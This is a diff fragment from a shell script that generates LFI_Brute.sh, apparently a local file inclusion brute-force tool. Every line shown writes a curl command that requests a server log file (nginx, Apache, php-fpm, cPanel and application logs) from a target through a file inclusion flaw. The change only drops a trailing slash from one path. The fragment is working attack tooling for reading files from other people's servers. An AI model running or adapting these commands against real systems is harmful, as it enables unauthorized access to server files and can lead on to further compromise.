@@ -65,7 +65,7 @@ echo $lfiurl | sed -E "s/(.*)/curl \1\/var\/log\/nginx\/error.log \>\> error.log
 echo $lfiurl | sed -E "s/(.*)/curl \1\/var\/log\/nginx\/access.log \>\> access.log/" >> LFI_Brute.sh
 echo $lfiurl | sed -E "s/(.*)/curl \1\/var\/log\/php5-fpm.log \>\> php5-fpm.log/" >> LFI_Brute.sh
 echo $lfiurl | sed -E "s/(.*)/curl \1\/private\/var\/log\/apache2\/error_log \>\> error_log/" >> LFI_Brute.sh
-echo $lfiurl | sed -E "s/(.*)/curl \1\/usr\/local\/cpanel\/logs\/ \>\> /" >> LFI_Brute.sh
+echo $lfiurl | sed -E "s/(.*)/curl \1\/usr\/local\/cpanel\/logs \>\> /" >> LFI_Brute.sh
 echo $lfiurl | sed -E "s/(.*)/curl \1\/var\/log\/php-errors.log \>\> php-errors.log/" >> LFI_Brute.sh
 echo $lfiurl | sed -E "s/(.*)/curl \1\/var\/log\/dev.log \>\> dev.log/" >> LFI_Brute.sh
 echo $lfiurl | sed -E "s/(.*)/curl \1\/var\/log\/prod.log \>\> prod.log/" >> LFI_Brute.sh
